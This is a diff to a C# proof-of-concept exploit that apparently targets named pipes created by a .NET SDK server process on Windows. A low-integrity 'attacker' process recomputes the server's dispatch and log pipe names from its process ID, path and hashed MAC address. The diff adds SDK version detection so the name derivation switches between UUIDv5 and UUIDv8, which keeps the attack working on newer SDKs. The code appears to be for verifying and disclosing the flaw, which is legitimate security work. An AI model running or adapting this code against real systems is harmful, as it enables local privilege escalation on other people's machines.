@@ -34,7 +34,8 @@ internal static class Program
 
             return await RunAttackerAsync(
                 serverPid: int.Parse(args[1]),
-                expectedParentPid: int.Parse(args[2]));
+                expectedParentPid: int.Parse(args[2]),
+                sdkMajor: int.Parse(args[4]));
         }
 
         if (args.Length > 0 && args[0] == "attacker-medium")
@@ -67,6 +68,10 @@ internal static class Program
             ?? throw new InvalidOperationException("Environment.ProcessPath unavailable.");
         string dll = Assembly.GetExecutingAssembly().Location;
         string clientTemp = Path.GetFullPath(Path.GetTempPath()).TrimEnd(Path.DirectorySeparatorChar);
+        string selectedSdkVersion = GetSelectedSdkVersion(dotnet);
+        int selectedSdkMajor = int.Parse(selectedSdkVersion.Split('.')[0]);
+        Console.WriteLine($"SELECTED_SDK_VERSION={selectedSdkVersion}");
+        Console.WriteLine($"SELECTED_SDK_MAJOR={selectedSdkMajor}");
 
         var serverStart = new ProcessStartInfo
         {
@@ -151,7 +156,7 @@ internal static class Program
         return confirmed ? 0 : 1;
     }
 
-    private static async Task<int> RunAttackerAsync(int serverPid, int expectedParentPid)
+    private static async Task<int> RunAttackerAsync(int serverPid, int expectedParentPid, int sdkMajor)
     {
         using WindowsIdentity identity = WindowsIdentity.GetCurrent();
         Console.WriteLine($"EXPECTED_PARENT_PID={expectedParentPid}");
@@ -178,8 +183,9 @@ internal static class Program
         }
         Console.WriteLine($"ATTACKER_DIRECT_HKLM_WRITE_ALLOWED={directWriteAllowed}");
 
-        string dispatchPipeName = CreatePipeName(serverPid);
-        string logPipeName = CreatePipeName(serverPid, "log");
+        Console.WriteLine($"ATTACKER_TARGET_SDK_MAJOR={sdkMajor}");
+        string dispatchPipeName = CreatePipeName(serverPid, sdkMajor);
+        string logPipeName = CreatePipeName(serverPid, sdkMajor, "log");
         Console.WriteLine($"DISPATCH_PIPE={dispatchPipeName}");
         Console.WriteLine($"LOG_PIPE={logPipeName}");
 
@@ -643,7 +649,7 @@ internal static class Program
         }
     }
 
-    private static string CreatePipeName(int processId, params string[] values)
+    private static string CreatePipeName(int processId, int sdkMajor, params string[] values)
     {
         string processPath = (Environment.ProcessPath
             ?? throw new InvalidOperationException("Environment.ProcessPath unavailable.")).ToLowerInvariant();
@@ -653,7 +659,29 @@ internal static class Program
 
         string hashedMac = Convert.ToHexStringLower(SHA256.HashData(Encoding.UTF8.GetBytes(mac)));
         string name = $"{processId};{processPath};{hashedMac};{string.Join(";", values)}";
-        return CreateUuid(name).ToString("B");
+        return sdkMajor >= 10 ? CreateUuidV8(name).ToString("B") : CreateUuidV5(name).ToString("B");
+    }
+
+    private static string GetSelectedSdkVersion(string dotnet)
+    {
+        var psi = new ProcessStartInfo
+        {
+            FileName = dotnet,
+            Arguments = "--version",
+            UseShellExecute = false,
+            RedirectStandardOutput = true,
+            RedirectStandardError = true,
+            CreateNoWindow = true,
+        };
+        using Process p = Process.Start(psi) ?? throw new InvalidOperationException("Failed to query selected SDK version.");
+        string stdout = p.StandardOutput.ReadToEnd().Trim();
+        string stderr = p.StandardError.ReadToEnd();
+        p.WaitForExit();
+        if (p.ExitCode != 0 || string.IsNullOrWhiteSpace(stdout))
+        {
+            throw new InvalidOperationException($"dotnet --version failed: {stderr}");
+        }
+        return stdout.Split(new[] {'\r','\n'}, StringSplitOptions.RemoveEmptyEntries)[0].Trim();
     }
 
     private static string? GetMacAddress()
@@ -667,7 +695,31 @@ internal static class Program
             .FirstOrDefault();
     }
 
-    private static Guid CreateUuid(string name)
+    private static Guid CreateUuidV5(string name)
+    {
+        Guid namespaceId = new("28F1468D-672B-489A-8E0C-7C5B3030630C");
+        byte[] nameBytes = Encoding.UTF8.GetBytes(name);
+        byte[] namespaceBytes = namespaceId.ToByteArray();
+
+        SwapGuidByteOrder(namespaceBytes);
+
+        byte[] streamToHash = new byte[namespaceBytes.Length + nameBytes.Length];
+        Array.Copy(namespaceBytes, streamToHash, namespaceBytes.Length);
+        Array.Copy(nameBytes, 0, streamToHash, namespaceBytes.Length, nameBytes.Length);
+
+        using SHA1 sha1 = SHA1.Create();
+        byte[] hashResult = sha1.ComputeHash(streamToHash);
+        byte[] result = new byte[16];
+        Array.Copy(hashResult, result, result.Length);
+
+        result[6] = (byte)(0x50 | (result[6] & 0x0F));
+        result[8] = (byte)(0x40 | (result[8] & 0x3F));
+        SwapGuidByteOrder(result);
+
+        return new Guid(result);
+    }
+
+    private static Guid CreateUuidV8(string name)
     {
         Guid namespaceId = new("28F1468D-672B-489A-8E0C-7C5B3030630C");
         byte[] nameBytes = Encoding.UTF8.GetBytes(name);
@@ -705,7 +757,8 @@ internal static class Program
         string dll,
         int serverPid,
         int expectedParentPid,
-        string evidencePath)
+        string evidencePath,
+        int sdkMajor)
     {
         const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
         const uint TOKEN_DUPLICATE = 0x0002;
@@ -786,7 +839,7 @@ internal static class Program
                 throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error(), "SetTokenInformation(TokenIntegrityLevel) failed");
             }
 
-            string args = $"\"{dll}\" attacker {serverPid} {expectedParentPid} \"{evidencePath}\"";
+            string args = $"\"{dll}\" attacker {serverPid} {expectedParentPid} \"{evidencePath}\" {sdkMajor}";
             var commandLine = new StringBuilder($"\"{dotnet}\" {args}");
             STARTUPINFO si = new() { cb = Marshal.SizeOf<STARTUPINFO>() };
 
